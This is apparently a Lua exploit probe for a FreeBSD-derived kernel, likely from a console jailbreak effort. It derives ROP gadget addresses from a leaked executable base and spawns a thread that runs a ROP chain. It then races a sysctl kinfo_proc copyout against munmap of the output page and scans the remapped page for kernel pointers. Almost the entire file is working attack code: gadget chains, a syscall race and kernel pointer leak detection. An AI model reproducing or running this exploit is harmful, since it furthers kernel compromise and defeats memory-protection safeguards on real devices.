-- CRASH_CLASS: MODERATE
-- PROBE 398c: simplified sysctl + munmap race
--
-- Stripped down: child only does munmap (no remap), lots of debug prints.
-- Main: sysctl writes kinfo_proc to output buffer.
-- Child: munmaps that buffer mid-copyout.
-- After race: main remaps at same address and scans for kernel residue.

print("=== PROBE 398c: sysctl+munmap simple ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function w64(addr, lo, hi)
    wd(addr, lo or 0); wd(addr + 4, hi or 0)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid_val
end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eb=%X_%08X", eb_hi, eb_lo))

local function g(off)
    return uint64(string.format("0x%X%08X", eb_hi, eb_lo + off))
end
local function g_lohi(off)
    local lo = eb_lo + off; local hi = eb_hi
    if lo >= 0x100000000 then hi = hi + math.floor(lo / 0x100000000); lo = lo % 0x100000000 end
    return lo, hi
end

local pop_rax_ret = g(0x992)
local pop_rdi_ret = g(0xC9DFE)
local pop_rsi_ret = g(0xD77D)
local pop_rdx_ret = g(0x3B02D7)
local pop_rcx_ret = g(0xE64)
local mov_rdi_rax = g(0x92C67)
local bare_ret    = g(0x42)

local sa = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(sa) + i, 0) end
wq(sa, uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(11), sa, uint64(0)) end)
pcall(function() mk(416)(uint64(10), sa, uint64(0)) end)

local tcb_buf = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(tcb_buf) + i, 0) end
local tcb_mid = N(tcb_buf) + 0x800
wd(tcb_mid, tcb_mid % 0x100000000)
wd(tcb_mid + 4, math.floor(tcb_mid / 0x100000000))
local tcb_ptr = memory.alloc(8)
wq(tcb_ptr, uint64(tcb_mid))

local shared = memory.alloc(0x100)

-- ============================================
-- Sanity: sysctl baseline (no race)
-- ============================================
print("")
print("-- baseline sysctl --")

local mib = memory.alloc(16)
wd(N(mib), 1); wd(N(mib)+4, 14); wd(N(mib)+8, 1); wd(N(mib)+12, pid_val)

local baseline = memory.alloc(0x800)
for i = 0, 0x7FC, 4 do wd(N(baseline) + i, 0) end
local blen = memory.alloc(8)
wq(blen, uint64(0x800))

local ok_base, rv_base = pcall(function()
    return mk(202)(uint64(N(mib)), uint64(4), uint64(N(baseline)),
        uint64(N(blen)), uint64(0), uint64(0))
end)
local base_ret = ok_base and N(rv_base) or -999
local base_size = rd(N(blen)) or 0
print(string.format("sysctl_baseline=%d size=%d", base_ret, base_size))
print(string.format("  d0=%08X d1=%08X d2=%08X d3=%08X",
    rd(N(baseline)) or 0, rd(N(baseline)+4) or 0,
    rd(N(baseline)+8) or 0, rd(N(baseline)+12) or 0))
if not alive() then print("CANARY FAIL baseline"); return end

-- ============================================
-- Sanity: child thread launch
-- ============================================
print("")
print("-- child thread test --")

for i = 0, 0xFC, 4 do wd(N(shared) + i, 0) end

local child_stk = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(child_stk) + i, 0) end
local child_base = N(child_stk)
local CHILD_STK = 0x800
local child_rsp = ((child_base + CHILD_STK) - ((child_base + CHILD_STK) % 16)) - 8
local sp = child_rsp
local function push(val) wq(sp, val); sp = sp + 8 end

-- sysarch
push(uint64(165))
push(pop_rdi_ret); push(uint64(129))
push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
push(pop_rdx_ret); push(uint64(0))
push(pop_rcx_ret); push(uint64(0))
push(stub)

-- Write marker to shared
push(pop_rdi_ret); push(uint64(N(shared)))
push(pop_rax_ret); push(uint64(0x1234))
push(mov_rdi_rax)

-- exit
push(pop_rax_ret); push(uint64(431))
push(pop_rdi_ret); push(uint64(0))
push(stub)

local pa = memory.alloc(0x38)
for i = 0, 0x34, 4 do wd(N(pa) + i, 0) end
local sf_lo, sf_hi = g_lohi(0x992)
w64(N(pa), sf_lo, sf_hi)
w64(N(pa) + 0x10, child_base % 0x100000000, math.floor(child_base / 0x100000000))
w64(N(pa) + 0x18, CHILD_STK, 0)

local ok_thr, rv_thr = pcall(function()
    return mk(455)(uint64(N(pa)), uint64(0x38))
end)
print(string.format("thr_new=%d", ok_thr and N(rv_thr) or -999))

local dummy = 0
for i = 1, 100000 do dummy = dummy + 1 end
local marker = rd(N(shared)) or 0
print(string.format("child_marker=%04X (expect 1234)", marker))
if not alive() then print("CANARY FAIL child test"); return end

-- ============================================
-- Race loop: 20 iterations
-- ============================================
print("")
print("-- race loop --")

local RACE_COUNT = 20
local sysctl_ok = 0
local sysctl_fail = 0
local data_found = 0
local kptr_found = 0

for iter = 1, RACE_COUNT do
    -- Map output page with sentinel
    local ok_p, outpage = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(0x3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    local ph, pl = 0, 0
    if ok_p and outpage then ph, pl = get_hi_lo(outpage) end
    if ph == 0 and pl == 0 then print("mmap fail " .. iter); break end
    local pbase = pl + ph * 0x100000000

    -- Sentinel fill
    for i = 0, 0x3FFC, 4 do wd(pbase + i, 0xDEADDEAD) end

    local oldlenp = memory.alloc(8)
    wq(oldlenp, uint64(0x4000))

    -- Child chain: sysarch + spin + munmap + marker + exit
    local cstk = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(cstk) + i, 0) end
    local cbase = N(cstk)
    local crsp = ((cbase + CHILD_STK) - ((cbase + CHILD_STK) % 16)) - 8
    sp = crsp

    -- sysarch(SET_FSBASE)
    push(uint64(165))
    push(pop_rdi_ret); push(uint64(129))
    push(pop_rsi_ret); push(uint64(N(tcb_ptr)))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Variable spin
    local spin = 3 + (iter % 15)
    for i = 1, spin do push(bare_ret) end

    -- munmap(outpage, 0x4000) — 4 args: rax=73, rdi=addr, rsi=len
    push(pop_rax_ret); push(uint64(73))
    push(pop_rdi_ret); push(outpage)
    push(pop_rsi_ret); push(uint64(0x4000))
    push(pop_rdx_ret); push(uint64(0))
    push(pop_rcx_ret); push(uint64(0))
    push(stub)

    -- Store munmap ret
    push(pop_rdi_ret); push(uint64(N(shared) + 0x04))
    push(mov_rdi_rax)

    -- Done marker
    push(pop_rdi_ret); push(uint64(N(shared)))
    push(pop_rax_ret); push(uint64(0xDDDD))
    push(mov_rdi_rax)

    push(pop_rax_ret); push(uint64(431))
    push(pop_rdi_ret); push(uint64(0))
    push(stub)

    -- Reset shared
    wd(N(shared), 0)
    wd(N(shared) + 4, 0xFF)

    -- Launch child
    local pa2 = memory.alloc(0x38)
    for i = 0, 0x34, 4 do wd(N(pa2) + i, 0) end
    w64(N(pa2), sf_lo, sf_hi)
    w64(N(pa2) + 0x10, cbase % 0x100000000, math.floor(cbase / 0x100000000))
    w64(N(pa2) + 0x18, CHILD_STK, 0)

    pcall(function() mk(455)(uint64(N(pa2)), uint64(0x38)) end)

    -- IMMEDIATELY call sysctl racing with child's munmap
    local ok_sc, rv_sc = pcall(function()
        return mk(202)(uint64(N(mib)), uint64(4), outpage,
            uint64(N(oldlenp)), uint64(0), uint64(0))
    end)
    local sc_ret = ok_sc and N(rv_sc) or -999
    if sc_ret == 0 then sysctl_ok = sysctl_ok + 1
    else sysctl_fail = sysctl_fail + 1 end

    -- Wait for child
    dummy = 0
    for i = 1, 100000 do dummy = dummy + 1 end

    local child_done = rd(N(shared)) or 0
    local munmap_ret = rd(N(shared) + 4) or 0xFF

    -- Remap at same address to capture any post-munmap writes
    local ok_rm, remap = pcall(function()
        return mk(477)(outpage, uint64(0x4000), uint64(0x3),
            uint64(0x1012), uint64(0xFFFFFFFF), uint64(0))
    end)
    local rh, rl = 0, 0
    if ok_rm and remap then rh, rl = get_hi_lo(remap) end

    if rh > 0 or rl > 0 then
        local rbase = rl + rh * 0x100000000
        -- Scan first 1100 bytes for non-zero (sysctl residue)
        local found_nonzero = false
        local local_kptr = 0
        for off = 0, 0x450, 4 do
            local v = rd(rbase + off) or 0
            if v ~= 0 then
                found_nonzero = true
                local vh = math.floor(v / 0x10000)
                if vh >= 0xFFFF8000 and vh ~= 0xFFFFFFFF then
                    local_kptr = local_kptr + 1
                    kptr_found = kptr_found + 1
                    if kptr_found <= 10 then
                        print(string.format("[%d] KPTR +%03X=%08X sc=%d done=%X unm=%X",
                            iter, off, v, sc_ret, child_done, munmap_ret))
                    end
                end
            end
        end
        if found_nonzero then
            data_found = data_found + 1
            if data_found <= 3 then
                local dump = ""
                local cnt = 0
                for off = 0, 0x450, 4 do
                    local v = rd(rbase + off) or 0
                    if v ~= 0 then
                        dump = dump .. string.format("+%03X=%08X ", off, v)
                        cnt = cnt + 1
                        if cnt >= 8 then break end
                    end
                end
                print(string.format("[%d] DATA: %s", iter, dump))
            end
        end
        pcall(function() mk(73)(remap, uint64(0x4000)) end)
    else
        -- Remap failed — page still there? Or address taken?
        -- Just try to clean up
        pcall(function() mk(73)(outpage, uint64(0x4000)) end)
    end

    if not alive() then print("CANARY FAIL iter " .. iter); break end
end

print(string.format("result: ok=%d fail=%d data=%d kptr=%d",
    sysctl_ok, sysctl_fail, data_found, kptr_found))
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 398c COMPLETE ===")
